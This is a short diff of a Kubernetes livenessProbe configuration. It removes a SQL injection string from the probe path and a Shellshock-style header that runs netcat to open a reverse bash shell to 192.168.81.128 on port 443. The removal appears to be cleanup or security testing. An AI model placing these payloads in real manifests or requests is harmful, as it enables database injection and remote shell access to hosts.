@@ -13,12 +13,7 @@ spec:
     livenessProbe:
       httpGet:
         host: www.radarhack.com
-        path: /index.html?test=' or 1=1--
+        path: /index.html
         port: 8080
-        httpHeaders:
-        - name: Custom-Header
-          value: Awesome
-        - name: X-Frame-Options
-          value: () { :;};echo;/bin/nc -e /bin/bash 192.168.81.128 443
       initialDelaySeconds: 3
       periodSeconds: 3
